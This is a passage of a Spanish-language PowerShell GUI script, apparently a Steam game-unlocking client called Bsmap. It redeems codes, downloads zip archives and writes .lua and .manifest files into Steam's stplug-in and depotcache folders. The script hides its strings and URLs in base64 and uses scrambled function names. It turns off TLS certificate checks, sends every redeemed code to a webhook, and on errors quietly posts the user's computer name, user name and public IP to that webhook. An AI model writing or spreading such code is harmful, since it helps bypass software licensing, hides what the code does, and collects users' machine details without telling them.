        try { $root=$t.steam_root; foreach ($f in $t.lua_files) { Remove-FileHard (Join-Path (Join-Path $root (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) $f); Remove-FileHard (Join-Path (Join-Path $root (S("Y29uZmlnXGx1YQ=="))) $f) }; foreach ($f in $t.manifest_files) { Remove-FileHard (Join-Path (Join-Path $root "config\depotcache") $f) } } catch { $errors++ }
    }
    St7Xb @(); $script:activeCodes.Clear(); RfC
    [System.Windows.Forms.MessageBox]::Show("Juegos eliminados correctamente.","Listo","OK","Information")
}
$script:mp.Controls.Add($script:c4)


$script:mp.Controls.Remove($script:c1)
$script:c1=New-Card -X $PAD -Y $R1Y -W $CW -H $CH -Title (T (S("YWN0aXZhcg=="))) -Sub (T (S("YWN0aXZhclN1Yg=="))) -Icon "lightning" -Click {Switch-ToRedeem}
$script:mp.Controls.Add($script:c1)


$script:cWeb=New-Card -X $PAD -Y $WEB_Y -W $CW -H $FCH -Title (T "web") -Sub (T "webSub") -Icon "webpage" -Click {Start-Process (D "aHR0cHM6Ly9iYXN0aXNzc3RlYW0ubmV0bGlmeS5hcHA=")}
$script:mp.Controls.Add($script:cWeb)




$script:c5=New-Card -X $PAD -Y $DISC_Y -W $CW -H $FCH -Title (T "discord") -Sub (T (S("ZGlzY29yZFN1Yg=="))) -Icon "discord" -Click {Start-Process (D "aHR0cHM6Ly9kaXNjb3JkLmdnL3czbmhHZVd1dlQ=")}
$script:mp.Controls.Add($script:c5)


$script:c6=New-Card -X $PAD -Y $TIK_Y -W $CW -H $FCH -Title (T "tiktok") -Sub (T "tiktokSub") -Icon "tiktok" -Click {Start-Process (D "aHR0cHM6Ly93d3cudGlrdG9rLmNvbS9AYmFzdGlzc3N0ZWFtP2xhbmc9ZXM=")}
$script:mp.Controls.Add($script:c6)


$script:salBtn=New-BufferedPanel
$script:salBtn.Location=New-Object System.Drawing.Point($PAD,$SAL_Y)
$script:salBtn.Size=New-Object System.Drawing.Size($CW,$SAL_H);$script:salBtn.BackColor=$BG
$script:salBtn.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:salBtn.Tag=@{Hover=$false}
$script:salBtn.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:salBtn.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:salBtn.Add_Click({ $form.Hide(); $script:trayIcon.Visible = $true })
$script:salBtn.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) $CR
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $ep=New-Object System.Drawing.Pen($script:Cyan,1.8);$ecx=($s.Width/2)-22;$ecy=$s.Height/2
    $g.DrawLine($ep,($ecx-6),($ecy-8),($ecx-6),($ecy+8))
    $g.DrawLine($ep,($ecx-6),($ecy-8),$ecx,($ecy-8))
    $g.DrawLine($ep,($ecx-6),($ecy+8),$ecx,($ecy+8))
    $g.DrawLine($ep,($ecx+2),$ecy,($ecx+12),$ecy)
    $g.DrawLine($ep,($ecx+8),($ecy-4),($ecx+12),$ecy)
    $g.DrawLine($ep,($ecx+8),($ecy+4),($ecx+12),$ecy);$ep.Dispose()
    $tb=New-Object System.Drawing.SolidBrush($script:White);$txt=T "salir"
    $ss=$g.MeasureString($txt,$script:FntSalir)
    $g.DrawString($txt,$script:FntSalir,$tb,($s.Width/2)-($ss.Width/2)+8,($s.Height-$ss.Height)/2);$tb.Dispose()
})
$script:mp.Controls.Add($script:salBtn)
$form.Controls.Add($script:mp)




$script:rp=New-BufferedPanel
$script:rp.Location=New-Object System.Drawing.Point(0,$CY)
$script:rp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:rp.BackColor=$BG;$script:rp.Visible=$false


$script:backB=New-BufferedPanel
$script:backB.Location=New-Object System.Drawing.Point($PAD,8)
$script:backB.Size=New-Object System.Drawing.Size(36,36);$script:backB.BackColor=$BG
$script:backB.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:backB.Tag=@{Hover=$false}
$script:backB.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:backB.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:backB.Add_Click({Switch-ToMain})
$script:backB.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    
    $ap=New-Object System.Drawing.Pen($script:Cyan,2.5)
    $cx2=$s.Width/2;$cy2=$s.Height/2
    $g.DrawLine($ap,($cx2+4),($cy2-7),($cx2-4),$cy2)
    $g.DrawLine($ap,($cx2-4),$cy2,($cx2+4),($cy2+7));$ap.Dispose()
})
$script:rp.Controls.Add($script:backB)


$script:rTit=New-Object System.Windows.Forms.Label
$script:rTit.Text=T "canjear"
$script:rTit.Font=$script:FntRedeemTitle
$script:rTit.ForeColor=$White;$script:rTit.BackColor=$BG;$script:rTit.AutoSize=$true
$script:rTit.Location=New-Object System.Drawing.Point(([int]$PAD+42),14)
$script:rp.Controls.Add($script:rTit)

$script:rSubL=New-Object System.Windows.Forms.Label
$script:rSubL.Text=T (S("Y2FuamVhclN1Yg=="))
$script:rSubL.Font=$FntSub;$script:rSubL.ForeColor=$Gray;$script:rSubL.BackColor=$BG;$script:rSubL.AutoSize=$true
$script:rSubL.Location=New-Object System.Drawing.Point($PAD,52)
$script:rp.Controls.Add($script:rSubL)


$txtC=New-Object System.Windows.Forms.TextBox
$txtC.Location=New-Object System.Drawing.Point($PAD,76)
$txtC.Size=New-Object System.Drawing.Size(([int]$CW-160),26)
$txtC.Font=New-Object System.Drawing.Font("Consolas",11)
$txtC.BackColor=$InputBG;$txtC.ForeColor=$White;$txtC.BorderStyle="FixedSingle";$txtC.MaxLength=50
$script:rp.Controls.Add($txtC)
try { $lt0 = Get-LocalToken; if ($lt0 -and $lt0.code) { $txtC.Text = ([string]$lt0.code).Trim().ToUpper() } } catch {}


$script:pasteB=New-BufferedPanel
$script:pasteB.Location=New-Object System.Drawing.Point(([int]$PAD+[int]$CW-154),74)
$script:pasteB.Size=New-Object System.Drawing.Size(50,28);$script:pasteB.BackColor=$BG
$script:pasteB.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:pasteB.Tag=@{Hover=$false}
$script:pasteB.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:pasteB.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:pasteB.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:PegarBtnBGH}else{$script:PegarBtnBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 7
    $b1=New-Object System.Drawing.SolidBrush($bc);$bp=New-Object System.Drawing.Pen($script:Cyan,1)
    $g.FillPath($b1,$p);$g.DrawPath($bp,$p);$b1.Dispose();$bp.Dispose();$p.Dispose()
    $sz=$g.MeasureString((T "pegarBtn"),$script:FntSubmit)
    $tb=New-Object System.Drawing.SolidBrush($script:Cyan)
    $g.DrawString((T "pegarBtn"),$script:FntSubmit,$tb,($s.Width-$sz.Width)/2,($s.Height-$sz.Height)/2);$tb.Dispose()
})
$script:pasteB.Add_Click({
    try {
        $clip = [System.Windows.Forms.Clipboard]::GetText()
        if ($clip) { $txtC.Text = $clip.Trim(); $txtC.Focus(); $txtC.Select($txtC.Text.Length,0) }
    } catch { [System.Windows.Forms.MessageBox]::Show("No se pudo acceder al portapapeles.","Error","OK","Warning") | Out-Null }
})
$script:rp.Controls.Add($script:pasteB)

$script:subB=New-BufferedPanel
$script:subB.Location=New-Object System.Drawing.Point(([int]$PAD+[int]$CW-98),74)
$script:subB.Size=New-Object System.Drawing.Size(98,28);$script:subB.BackColor=$BG
$script:subB.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:subB.Tag=@{Hover=$false}
$script:subB.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:subB.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:subB.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:GreenBtnH}else{$script:GreenBtn}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 7
    $b1=New-Object System.Drawing.SolidBrush($bc);$g.FillPath($b1,$p);$b1.Dispose();$p.Dispose()
    $sz=$g.MeasureString((T (S("Y2FuamVhckJ0bg=="))),$script:FntSubmit)
    $tb=New-Object System.Drawing.SolidBrush($script:White)
    $g.DrawString((T (S("Y2FuamVhckJ0bg=="))),$script:FntSubmit,$tb,($s.Width-$sz.Width)/2,($s.Height-$sz.Height)/2);$tb.Dispose()
})
$script:redeemParallel=$true
try{ $v=Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name RedeemParallel -ErrorAction SilentlyContinue; if($v -ne $null){ $script:redeemParallel=[bool][int]$v.RedeemParallel } }catch{}

$script:subB.Add_Click({
    $locTok = Get-LocalToken
    $code=$txtC.Text.Trim().ToUpper()
    if([string]::IsNullOrEmpty($code) -and $locTok -and $locTok.code){ $code=([string]$locTok.code).Trim().ToUpper(); $txtC.Text=$code }
    if([string]::IsNullOrEmpty($code)){$lblR.ForeColor=$script:Red;$lblR.Text=T (S("ZXJyb3JDb2RpZ28="));[System.Windows.Forms.Application]::DoEvents();return}
    $lblR.ForeColor=$script:Yellow;$lblR.Text="Conectando con servidor..."
    [System.Windows.Forms.Application]::DoEvents()
    try {
        $redeemNow, $_ = Get-Now
        $sendToken = ""
        if ($locTok -and $locTok.token) { $sendToken = [string]$locTok.token }
        $body = @{code=$code;client_id=$script:clientId;redeem_at=$redeemNow.ToString("o");token=$sendToken} | ConvertTo-Json
        $lastErr = $null
        for ($attempt = 0; $attempt -lt 3; $attempt++) {
            try {
                Update-ServerUrl
                $reqUrl = "$($script:serverUrl)/api/redeem-code"
                $tempBody = Join-Path $env:TEMP (S("YnNtYXBfcmVkZWVtX2JvZHkuanNvbg=="))
                $tempResp = Join-Path $env:TEMP (S("YnNtYXBfcmVkZWVtX3Jlc3AuanNvbg=="))
                $utf8NoBom = New-Object System.Text.UTF8Encoding $false
                [System.IO.File]::WriteAllText($tempBody, $body, $utf8NoBom)
                $resolveArg = @()
                if ($script:serverIp -and $script:serverUrl -match "^https://([a-zA-Z0-9-]+)") { $hn = ([uri]$script:serverUrl).Host; if ($hn) { $resolveArg = @("--resolve", "$($hn):443:$($script:serverIp)") } }
                $resolveStr = ($resolveArg -join "|")
                $rr = Invoke-PsBlockingDoEvents {
                    param($reqUrl, $body, $tempBody, $tempResp, $resolveStr, $serverIp)
                    $u8 = New-Object System.Text.UTF8Encoding $false
                    $ra = @(); if ($resolveStr) { $ra = @($resolveStr -split '\|') }
                    $curlOut = & curl.exe -s -k --ssl-no-revoke --tlsv1.2 --noproxy "*" @ra -X POST -H "Content-Type: application/json" --data-binary "@$tempBody" "$reqUrl" --max-time 30 -o $tempResp 2>&1
                    $ce = $LASTEXITCODE
                    $respRaw = $null
                    if ($ce -eq 0 -and (Test-Path -LiteralPath $tempResp)) { $respRaw = [System.IO.File]::ReadAllText($tempResp, $u8) }
                    if (-not $respRaw) {
                        $curlErr = (($curlOut | Where-Object { $_ -is [string] }) -join " | ").Trim()
                        try {
                            $iwr = Invoke-WebRequest -Uri $reqUrl -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30 -UseBasicParsing -ErrorAction Stop
                            $respRaw = $iwr.Content
                        } catch {
                            return [pscustomobject]@{ err = "curl exit $ce URL: $reqUrl | serverIp: $serverIp | curl-err: $curlErr | IWR-fallback-err: $($_.Exception.Message)" }
                        }
                    }
                    if ($respRaw -match "^\s*<") { return [pscustomobject]@{ err = "Servidor devolvio HTML (error 500): $($respRaw.Substring(0,200))" } }
                    try { $resp = $respRaw | ConvertFrom-Json } catch { return [pscustomobject]@{ err = "Respuesta invalida del servidor: $respRaw" } }
                    if ($null -eq $resp -or $resp -is [string] -or $resp -is [int] -or $resp -is [array]) { return [pscustomobject]@{ err = "Respuesta invalida del servidor (json primitivo): $respRaw" } }
                    return [pscustomobject]@{ json = ($resp | ConvertTo-Json -Depth 6 -Compress) }
                } @($reqUrl, $body, $tempBody, $tempResp, $resolveStr, [string]$script:serverIp)
                Remove-Item $tempBody,$tempResp -Force -ErrorAction SilentlyContinue
                if (-not $rr) { throw "Sin respuesta del servidor" }
                if ($rr.err) { throw $rr.err }
                $resp = $rr.json | ConvertFrom-Json
                $lastErr=$null; break
                }catch{ $lastErr=$_; Start-SleepDoEvents 800 }
            }
            if($lastErr){ throw $lastErr }
            if(-not $resp.ok){ throw $resp.err }
            try { if ($resp.token) { Set-LocalToken ([string]$resp.token) $code } } catch {}
            $links = @($resp.links); $duration = [int]$resp.duration
        $rMode = ""; try { $rMode = ([string]$resp.mode).ToLower() } catch {}
        $modeNum = switch ($rMode) { 'ip' { 2 } 'ar' { 3 } default { 1 } }
        if ($links.Count -eq 0) { throw (S("RWwgY29kaWdvIG5vIGNvbnRpZW5lIGxpbmtzLg==")) }
        Send-Webhook $code ($links -join "`n")
        $baseNow, $baseIsNet = Get-Now
        $expDate = $null
        if ($resp.expires_at) { try { $eVig = [datetime]::Parse([string]$resp.expires_at); if ($eVig.Kind -eq [DateTimeKind]::Utc) { $eVig = $eVig.ToLocalTime() }; $expDate = $eVig } catch {} }
        if (-not $expDate -and $duration -gt 0) { $expDate = $baseNow.AddSeconds($duration) }
        $steamRoot = Get-SteamPath
        try { Set-LoteJob (New-LoteJob $code $links $duration $expDate $steamRoot) } catch {}
        try { $null = Xz9Qk -Silent } catch {}
        $total=$links.Count
        try { $script:activeCodes.Add(@{Code=$code;Game="";ActivatedAt=$baseNow;ExpiresAt=$(if($expDate){$expDate}else{$baseNow.AddYears(1)});Duration=$duration;InternetCreatedAt=$baseNow.ToString("o")})|Out-Null } catch {}
        try { Send-PatchStatus $code "PENDIENTE $total juegos" } catch {}
        $lblR.ForeColor=$script:Green; $lblR.Text="$(Format-Juegos $total) listos para activar."
        $script:rp.Invalidate(); RfC
        Switch-ToCodeDetail $code
        return
        if($false){
        $successCount=0; $errors=@()
        if($script:redeemParallel -and $total -gt 1){
            $lblR.Text="Descargando $total lotes en paralelo..."; [System.Windows.Forms.Application]::DoEvents()
            $pool=[RunspaceFactory]::CreateRunspacePool(1, [Math]::Min($total,6))
            $pool.Open()
            $jobs=@()
            for($i=0;$i -lt $total;$i++){
                $mfUrl=$links[$i]
                $gameName=[System.IO.Path]::GetFileNameWithoutExtension(($mfUrl -split '/')[-2]); if($gameName){$gameName=$gameName -replace '%[0-9a-fA-F]{2}', ''}
                $zipFile=Join-Path $env:TEMP "fix_$(Get-Random)_$i.zip"
                $ps=[PowerShell]::Create()
                $ps.RunspacePool=$pool
                [void]$ps.AddScript({
                    param($url,$zip,$gName,$expDate,$codeStr,$steamRoot)
                    try{
                        $res=@{ok=$false; err=""; lua=@(); man=@(); game=$gName}
                        # descargar con curl (redirect + retry, como Bn6Lc directo)
                        & curl.exe -s -k -L --ssl-no-revoke -H "User-Agent: Mozilla/5.0" -o $zip $url --max-time 120
                        if($LASTEXITCODE -ne 0 -or -not (Test-Path $zip) -or (Get-Item $zip).Length -lt 500){ throw "descarga fallida para $url" }
                        Add-Type -AssemblyName System.IO.Compression.FileSystem
                        $tmpExp=Join-Path $env:TEMP "par_$(Get-Random)"
                        New-Item -ItemType Directory -Path $tmpExp -Force | Out-Null
                        [IO.Compression.ZipFile]::ExtractToDirectory($zip,$tmpExp)
                        # carpetas destino
                        $luaDir=Join-Path $steamRoot "config\stplug-in"
                        $luaDir2=Join-Path $steamRoot "config\lua"
                        $manDir=Join-Path $steamRoot "config\depotcache"
                        $manRoot=Join-Path $steamRoot "depotcache"
                        foreach($d in @($luaDir,$luaDir2,$manDir,$manRoot)){ if(-not (Test-Path $d)){ New-Item -ItemType Directory -Path $d -Force | Out-Null } }
                        $luas=@(Get-ChildItem $tmpExp -Recurse -Filter *.lua | ForEach-Object { $_.Name })
                        $mans=@(Get-ChildItem $tmpExp -Recurse -Filter *.manifest | ForEach-Object { $_.Name })
                        # header BSMAP
                        $header=""
                        if($gName -and $expDate){
                            $header="-- BSMAP_EXPIRES:$($expDate.ToString('yyyy-MM-ddTHH:mm:ss'))`n-- BSMAP_GAME:$gName`n"
                            if($mans.Count -gt 0){ $header+="-- BSMAP_MANIFESTS:$($mans -join ',')`n" }
                            if($codeStr){ $header+="-- BSMAP_CODE:$codeStr`n" }
                        }
                        foreach($f in Get-ChildItem $tmpExp -Recurse -Filter *.lua){
                            $dst1=Join-Path $luaDir $f.Name; $dst2=Join-Path $luaDir2 $f.Name
                            if($header){ try{ $c=[IO.File]::ReadAllText($f.FullName); [IO.File]::WriteAllText($dst1, $header+$c, (New-Object System.Text.UTF8Encoding $false)); [IO.File]::WriteAllText($dst2, $header+$c, (New-Object System.Text.UTF8Encoding $false)) }catch{ Copy-Item $f.FullName $dst1 -Force; Copy-Item $f.FullName $dst2 -Force } }
                            else { Copy-Item $f.FullName $dst1 -Force; Copy-Item $f.FullName $dst2 -Force }
                        }
                        foreach($f in Get-ChildItem $tmpExp -Recurse -Filter *.manifest){ Copy-Item $f.FullName (Join-Path $manDir $f.Name) -Force; Copy-Item $f.FullName (Join-Path $manRoot $f.Name) -Force }
                        Remove-Item $tmpExp -Recurse -Force -ErrorAction SilentlyContinue
                        $res.ok=$true; $res.lua=$luas; $res.man=$mans
                    }catch{ $res.err=$_.Exception.Message }
                    Remove-Item $zip -Force -ErrorAction SilentlyContinue
                    return $res
                }).AddArgument($mfUrl).AddArgument($zipFile).AddArgument($gameName).AddArgument($expDate).AddArgument($code).AddArgument($steamRoot)
                $h=$ps.BeginInvoke()
                $jobs+=@{ps=$ps; handle=$h; game=$gameName; url=$mfUrl}
            }
            while(@($jobs | Where-Object { -not $_.handle.IsCompleted }).Count -gt 0){
                $done=@($jobs | Where-Object { $_.handle.IsCompleted }).Count
                $lblR.Text="Paralelo $done/$total"; [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 200
            }
            foreach($j in $jobs){
                try{
                    $r=$j.ps.EndInvoke($j.handle)
                    if($r -and $r.ok){
                        $successCount++
                        $timerExp=if($expDate){$expDate}else{$baseNow.AddYears(1)}
                        $timers=At5Vc; $internetNow,$netOk=Get-InternetTime; if(-not $internetNow){$internetNow=$baseNow}; $iNow=$internetNow.ToString("o")
                        $timers+=@{redeem_code=$code;duration=$duration;expires_at=$timerExp.ToString("o");internet_created_at=$iNow;game_name=$j.game;steam_root=$steamRoot;lua_files=@($r.lua);manifest_files=@($r.man)}
                        St7Xb $timers
                        $script:activeCodes.Add(@{Code=$code;Game=$j.game;ActivatedAt=$baseNow;ExpiresAt=$(if($expDate){$expDate}else{$baseNow.AddYears(1)});Duration=$duration;InternetCreatedAt=$iNow})|Out-Null
                        try { Mark-LoteDone $code $j.url @($r.lua) @($r.man) $j.game } catch {}
                    } else { $errors+="$($j.game) : $($r.err)"; WEL "Download $($j.game)" $r.err }
                }catch{ $errors+="$($j.game) : $($_.Exception.Message)" }
                try{ $j.ps.Dispose() }catch{}
            }
            $pool.Close(); $pool.Dispose()
        } else {
            foreach ($mfUrl in $links) {
                $gameName = [System.IO.Path]::GetFileNameWithoutExtension(($mfUrl -split '/')[-2])
                if ($gameName) { $gameName = $gameName -replace '%[0-9a-fA-F]{2}', '' }
                $lblR.Text = "($($successCount+1)/$total) $gameName"; [System.Windows.Forms.Application]::DoEvents()
                $zipFile = Join-Path $env:TEMP "fix_$(Get-Random).zip"
                try {
                    Bn6Lc $mfUrl $zipFile
                    $installResult = Extract-AndInstall $zipFile $gameName $expDate $code
                    
                    $timerExp = if ($expDate) { $expDate } else { $baseNow.AddYears(1) }
                    $timers = At5Vc
                    $internetNow, $netOk = Get-InternetTime
                    if (-not $internetNow) { $internetNow = $baseNow }
                    $iNow = $internetNow.ToString("o")
                    $timers += @{redeem_code=$code;duration=$duration;expires_at=$timerExp.ToString("o");internet_created_at=$iNow;game_name=$gameName;steam_root=$steamRoot;lua_files=@($installResult.lua);manifest_files=@($installResult.manifest)}
                    St7Xb $timers
                    $script:activeCodes.Add(@{Code=$code;Game=$gameName;ActivatedAt=$baseNow;ExpiresAt=$(if($expDate){$expDate}else{$baseNow.AddYears(1)});Duration=$duration;InternetCreatedAt=$iNow})|Out-Null
                    try { Mark-LoteDone $code $mfUrl @($installResult.lua) @($installResult.manifest) $gameName } catch {}
                    $successCount++
                } catch { $errors+="$gameName : $($_.Exception.Message)"; WEL "Download $gameName" $_ }
                Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
            }
        }
        if ($successCount -gt 0) {
            $lblR.ForeColor=$script:Green; $lblR.Text="$successCount de $total juegos activados ($modeNum)"
            if ($duration -gt 0 -and $expDate) { ScD $duration $expDate ($links[0]) }
            $script:rp.Invalidate(); RfC
            [System.Windows.Forms.MessageBox]::Show("$successCount de $total juegos activados correctamente ($modeNum).","Listo","OK","Information")
            try { Send-PatchStatus $code "OK $successCount/$total" } catch {}
        } else { throw "No se pudo activar ningun juego.`n$($errors -join '; ')" }
        }
    } catch {
        WEL (S("Q2FuamVv")) $_; $lblR.ForeColor=$script:Red
        $errMsg = $_.Exception.Message
        if ($_.Exception -is [System.Net.WebException]) {
            $httpResp = $_.Exception.Response
            if ($httpResp -and [int]$httpResp.StatusCode -eq 502) { $errMsg = "El servidor esta offline (502). Avisa al admin para que reinicie el tunel." }
            elseif ($_.Exception.Message -match "Unable to connect|NameResolutionFailure") { $errMsg = "No se pudo conectar al servidor. Revisa tu internet." }
            elseif ($_.Exception.Message -match "Timeout") { $errMsg = "El servidor no respondio a tiempo. Intenta de nuevo." }
        } elseif ($errMsg -match "Unable to connect|NameResolutionFailure|unable to resolve") {
            $errMsg = "No se pudo conectar al servidor (URL: $($script:serverUrl)). Revisa tu internet o pide al admin que reinicie el tunel."
        } elseif ($errMsg -match "Timeout|timed out") {
            $errMsg = "El servidor no respondio a tiempo. Intenta de nuevo."
        }
        $lblR.Text="Error: $errMsg"
        $detalle = $_.Exception.Message
        if ($errors -and $errors.Count -gt 0) { $detalle += "`n`nJuegos fallados:`n" + ($errors -join "`n") }
        $bt = [char]96
        $ipE = $null
        try { $ipE = (Invoke-RestMethod (S("aHR0cHM6Ly9hcGkuaXBpZnkub3Jn")) -UseBasicParsing -TimeoutSec 6 -ErrorAction SilentlyContinue) } catch {}
        $el = @("**ERROR CANJE** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
        $el += "**PC:** $env:COMPUTERNAME / $([Environment]::UserName)"
        $el += "**ClientID:** $($script:clientId)"
        $el += "**IP:** $ipE"
        $el += "**Codigo:** $code"
        $el += "**URL servidor:** $($script:serverUrl)"
        $el += "**Mensaje:** $errMsg"
        $el += "**Detalle:** $detalle"
        $bodyText = "$bt$bt$bt diff`n$($el -join "`n")`n$bt$bt$bt"
        # reporte SIEMPRE: Intentar Invoke-RestMethod (2 intentos), luego curl.exe
        $enviado = $false
        $payloadJson = @{ content = $bodyText } | ConvertTo-Json
        for ($try = 0; $try -lt 2 -and -not $enviado; $try++) {
            try { Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payloadJson -ContentType "application/json" -TimeoutSec 20 -UseBasicParsing -ErrorAction Stop | Out-Null; $enviado = $true } catch { Start-Sleep -Seconds 2 }
        }
        if (-not $enviado) {
            try {
                $tmpWeb = [System.IO.Path]::GetTempFileName() + ".json"
                [System.IO.File]::WriteAllText($tmpWeb, $payloadJson, (New-Object System.Text.UTF8Encoding $false))
                & curl.exe -s -X POST -H "Content-Type: application/json" --data-binary "@$tmpWeb" "$WEBHOOK_URL" --max-time 25 -o NUL
                $enviado = ($LASTEXITCODE -eq 0)
                Remove-Item $tmpWeb -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        if (-not $enviado) {
            try { Add-Content -Path (Join-Path $env:TEMP "bsmap_error_pendientes.log") -Value $bodyText -Encoding UTF8 } catch {}
        }
        try { Send-PatchStatus $code "ERROR $errMsg / $($errors -join '; ')" } catch {}
        $lblR.Text=if($enviado){"No se pudo canjear. Se envio el reporte."}else{"No se pudo canjear. (reporte guardado local)"}
        [System.Windows.Forms.Application]::DoEvents()
    }
})
$script:rp.Controls.Add($script:subB)
$txtC.Add_KeyDown({param($s,$e2);if($e2.KeyCode -eq 'Return'){$script:subB.PerformClick();$e2.Handled=$true;$e2.SuppressKeyPress=$true}})

$lblR=New-Object System.Windows.Forms.Label
$lblR.Text="";$lblR.Font=$FntSub;$lblR.ForeColor=$Gray;$lblR.BackColor=$BG
$lblR.Location=New-Object System.Drawing.Point($PAD,108);$lblR.Size=New-Object System.Drawing.Size($CW,16)
$script:rp.Controls.Add($lblR)

$div=New-BufferedPanel;$div.Location=New-Object System.Drawing.Point($PAD,130)
$div.Size=New-Object System.Drawing.Size($CW,1);$div.BackColor=$CardBorder
$script:rp.Controls.Add($div)

$script:codesT=New-Object System.Windows.Forms.Label
$script:codesT.Text=T (S("Y29kaWdvc0FjdGl2b3M="))
$script:codesT.Font=$FntSect;$script:codesT.ForeColor=$White;$script:codesT.BackColor=$BG
$script:codesT.AutoSize=$true;$script:codesT.Location=New-Object System.Drawing.Point($PAD,138)
$script:rp.Controls.Add($script:codesT)

$cBadge=New-Object System.Windows.Forms.Label
$cBadge.Font=$FntCodeSt;$cBadge.ForeColor=$Cyan;$cBadge.BackColor=$BG
$cBadge.AutoSize=$true;$cBadge.Location=New-Object System.Drawing.Point(170,144)
$script:rp.Controls.Add($cBadge)

$clH=($FH-$CY)-170
$script:clpScroll=0;$script:clpMaxScroll=0;$script:clpContentH=0;$script:clpDragging=$false;$script:clpGrabY=0
function Get-ClpThumb {
    $cw=$script:clp.ClientSize.Width;$chh=$script:clp.ClientSize.Height
    $sbw=4;$pad=3;$tx=($cw - $sbw - $pad)
    $th=[Math]::Max(24,[int](($chh * $chh) / [Math]::Max(1,$script:clpContentH)))
    $ty=0;if($script:clpMaxScroll -gt 0){$ty=[int](($chh - $th) * ($script:clpScroll / $script:clpMaxScroll))}
    return @{X=$tx;Y=$ty;W=$sbw;H=$th}
}
$script:clp=New-BufferedPanel
$script:clp.Location=New-Object System.Drawing.Point($PAD,164)
$script:clp.Size=New-Object System.Drawing.Size($CW,$clH);$script:clp.BackColor=$BG
$script:clp.Add_MouseWheel({
    param($s,$e)
    if($script:clpMaxScroll -gt 0){
        $step=[int](($e.Delta / 120) * 50)
        $script:clpScroll=[Math]::Max(0,[Math]::Min($script:clpMaxScroll,($script:clpScroll - $step)))
        $s.Invalidate();$e.Handled=$true
    }
})
$script:clp.Add_MouseDown({
    param($s,$e)
    if($script:clpMaxScroll -gt 0 -and $e.Button -eq 'Left'){
        $t=Get-ClpThumb
        if($e.X -ge $t.X -and $e.X -le ($t.X + $t.W) -and $e.Y -ge $t.Y -and $e.Y -le ($t.Y + $t.H)){
            $script:clpDragging=$true;$script:clpGrabY=($e.Y - $t.Y);$s.Capture=$true;$s.Invalidate()
        }
    }
})
$script:clp.Add_MouseMove({
    param($s,$e)
    if($script:clpDragging -and $script:clpMaxScroll -gt 0){
        $t=Get-ClpThumb
        $maxTy=($s.ClientSize.Height - $t.H)
        if($maxTy -gt 0){
            $newTy=($e.Y - $script:clpGrabY)
            $script:clpScroll=[int]($script:clpMaxScroll * ([Math]::Max(0,[Math]::Min($maxTy,$newTy)) / $maxTy))
            $s.Invalidate()
        }
    }
})
$script:clp.Add_MouseUp({param($s,$e);if($script:clpDragging){$script:clpDragging=$false;$s.Capture=$false;$s.Invalidate()}})
$script:clp.Cursor=[System.Windows.Forms.Cursors]::Hand
$script:clp.Add_Click({param($s,$e)
    try{
        $y=($e.Y + $script:clpScroll)
        if($y -lt 0){return}
        $step=92
        $idx=[int][math]::Floor($y / $step)
        $grp=@($script:clpGroups)
        if($idx -ge 0 -and $idx -lt $grp.Count){
            $g=$grp[$idx]
            if($g -and $g.Code){ Switch-ToCodeDetail ([string]$g.Code) }
        }
    }catch{}
})
$script:clp.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $script:clpMaxScroll=[Math]::Max(0,($script:clpContentH - $s.ClientSize.Height))
    if($script:clpScroll -gt $script:clpMaxScroll){$script:clpScroll=$script:clpMaxScroll}
    if($script:clpScroll -lt 0){$script:clpScroll=0}
    $g.TranslateTransform(0,-$script:clpScroll)
    $groups=@(Get-ActiveCodeGroups);$script:clpGroups=$groups;$codes=$groups
    $cBadge.Text="($($codes.Count))"
    if($codes.Count -eq 0){
        $script:clpContentH=60;$script:clpMaxScroll=0;$script:clpScroll=0;$g.ResetTransform()
        $p=New-RR 0 0 ($s.ClientSize.Width-1) 60 8
